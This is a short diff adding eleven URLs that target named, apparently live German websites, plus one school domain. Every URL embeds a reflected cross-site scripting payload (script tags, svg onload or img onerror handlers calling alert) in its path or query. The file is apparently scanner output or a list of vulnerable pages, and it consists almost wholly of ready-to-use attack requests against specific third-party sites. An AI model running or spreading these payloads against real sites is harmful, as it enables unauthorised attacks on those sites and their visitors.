@@ -1,0 +1,11 @@
+http://fiduscom.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://filges-it-beratung.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://friedrich-u-maier.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://fwg-freiburg.de/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%272NFF3R9h63NsM4Y04Se3fIA6AVy%27)%3C/script%3E
+http://fwgisa.fwg.fr.bw.schule.de/cms/info.php?mod=list%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://garagentreff.yooco.de/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+https://friedberg-journal.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://friedberg-rundschau.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://friedrichsdorf-tageblatt.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://friedrichshafen-rundschau.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://galerie.flohuber.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
